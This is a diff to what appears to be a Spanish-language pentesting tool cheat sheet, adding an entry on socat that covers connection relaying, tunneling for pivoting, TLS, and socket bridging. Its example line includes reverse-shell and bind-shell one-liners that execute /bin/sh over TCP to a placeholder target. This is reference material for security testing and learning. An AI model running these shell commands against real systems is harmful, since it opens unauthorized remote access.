@@ -293,6 +293,20 @@ Herramienta que realiza una **recorrida (walk) por la MIB via SNMP** para listar
 - Riesgos: si SNMP community strings son débiles (`public`/`private`) puede filtrar información sensible; atención en redes ajenas.  
 - Ejemplos: `snmpwalk -v2c -c public <IP>`, `snmpwalk -v3 -u user -A authpass -X privpass <IP>`
 
+### `socat`
+
+Herramienta multipropósito que permite crear, redirigir y manipular conexiones entre dos endpoints utilizando distintos protocolos y tipos de sockets.
+
+- Permite establecer conexiones TCP, UDP y UNIX sockets para comunicar procesos entre máquinas o dentro del mismo sistema.
+- Puede abrir un puerto en modo escucha y ejecutar un comando cuando un cliente se conecta, ideal para pruebas o shells.
+- Facilita la creación de reverse shells y bind shells estables cuando netcat no está disponible o carece de ciertas opciones.
+- Permite tunelar puertos locales hacia destinos remotos, útil para pivoting y acceso a servicios internos durante un pentest.
+- Puede exponer sockets internos del sistema (UNIX sockets) como puertos TCP accesibles desde la red.
+- Soporta conexiones cifradas con SSL/TLS para asegurar el tráfico entre ambos extremos sin configuración compleja.
+- Capaz de traducir entre protocolos o tipos de sockets distintos, actuando como puente flexible entre servicios.
+- Funciona como alternativa más avanzada que netcat para depurar servicios, redirigir tráfico y realizar pruebas de red complejas.
+- Ejemplos: `socat TCP:IP_target:PORT EXEC:/bin/sh` · `socat TCP-LISTEN:PORT,fork EXEC:/bin/sh` · `socat TCP-LISTEN:LOCAL_PORT,fork TCP:IP_target:REMOTE_PORT` · `socat OPENSSL:IP_target:PORT STDOUT`
+
 ### `sublist3r`  
 Herramienta en Python para **enumerar subdominios**.  
 - Usa motores de búsqueda (Google, Bing, Yahoo, Baidu, Ask).  
